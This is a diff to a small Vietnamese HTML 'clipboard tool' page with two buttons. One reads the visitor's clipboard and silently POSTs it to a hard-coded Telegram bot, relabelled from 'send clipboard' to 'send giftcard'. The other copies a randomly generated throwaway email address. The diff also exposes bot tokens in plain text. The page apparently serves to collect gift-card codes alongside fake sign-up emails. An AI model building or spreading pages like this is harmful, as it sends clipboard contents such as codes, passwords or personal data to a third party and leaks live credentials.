@@ -2,17 +2,54 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Gửi Clipboard</title>
+  <title>Tool Clipboard</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 16px;
+      margin-top: 12px;
+      font-size: 18px;
+    }
+  </style>
 </head>
 <body>
 
-<button onclick="sendClipboard()">📤 Dán & Gửi</button>
+<h2>📋 Clipboard Tool</h2>
+
+<button onclick="sendGiftcard()">📤 Gửi giftcard</button>
+<button onclick="copyRandomEmail()">📧 Copy email ngẫu nhiên</button>
 
 <script>
-const BOT_TOKEN = "8532371199:AAGPwvx5Jt1Ul6Js0DuzRJk-RVhuWROH0R0";
+const BOT_TOKEN = "8379215075:AAHfjpWkGkmXJoiya1mVJH8Nd1wCgXTtPs4";
 const CHAT_ID = "5376711844";
 
+/* ===== NÚT 1: GỬI GIFT CARD ===== */
+async function sendGiftcard() {
+  let text = "";
+  try {
+    text = await navigator.clipboard.readText();
+  } catch (e) {
+    return;
+  }
+
+  if (!text) return;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  }).catch(() => {});
+}
+
+/* ===== NÚT 2: COPY EMAIL NGẪU NHIÊN ===== */
 function generateEmail() {
   const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
   const domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"];
@@ -23,35 +60,15 @@ function generateEmail() {
   return name + "@" + domains[Math.floor(Math.random() * domains.length)];
 }
 
-async function sendClipboard() {
-  let text = "";
-
-  // 1️⃣ đọc clipboard
-  try {
-    text = await navigator.clipboard.readText();
-  } catch (e) {
-    return;
-  }
-
-  if (!text) return;
-
-  // 2️⃣ gửi về Telegram
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text
-    })
-  }).catch(() => {});
-
-  // 3️⃣ TẠO EMAIL & COPY BẰNG textarea hack
+function copyRandomEmail() {
   const email = generateEmail();
+
+  // textarea hack – chạy chắc trên mobile
   const temp = document.createElement("textarea");
   temp.value = email;
   document.body.appendChild(temp);
   temp.select();
-  temp.setSelectionRange(0, 99999); // mobile
+  temp.setSelectionRange(0, 99999);
   document.execCommand("copy");
   document.body.removeChild(temp);
 }
